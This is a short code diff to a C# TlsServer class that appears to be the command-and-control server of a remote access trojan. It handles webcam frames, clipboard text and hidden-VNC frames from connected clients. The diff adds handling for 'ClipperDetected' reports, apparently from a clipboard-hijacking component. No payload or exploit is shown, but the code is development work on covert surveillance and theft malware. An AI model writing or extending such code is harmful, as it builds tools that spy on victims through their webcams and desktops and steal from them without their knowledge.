@@ -34,6 +34,7 @@ public class TlsServer
     public event Action<string, string>? WcamFrameReceived;     // clientId, rawJson
     public event Action<string, string>? RdpClipboardReceived;  // clientId, text
     public event Action<string, string>? HvncFrameReceived;     // clientId, rawJson
+    public event Action<string, ClipperDetectedData>? ClipperDetectedReceived; // clientId, data
     public event Action<string>? OnLog;
 
     public bool IsRunning { get; private set; }
@@ -334,6 +335,12 @@ public class TlsServer
 
                     case PacketType.HvncFrame:
                         HvncFrameReceived?.Invoke(client.Id, packet.Data);
+                        break;
+
+                    case PacketType.ClipperDetected:
+                        var clipDet = JsonConvert.DeserializeObject<ClipperDetectedData>(packet.Data);
+                        if (clipDet != null)
+                            ClipperDetectedReceived?.Invoke(client.Id, clipDet);
                         break;
 
                     default:
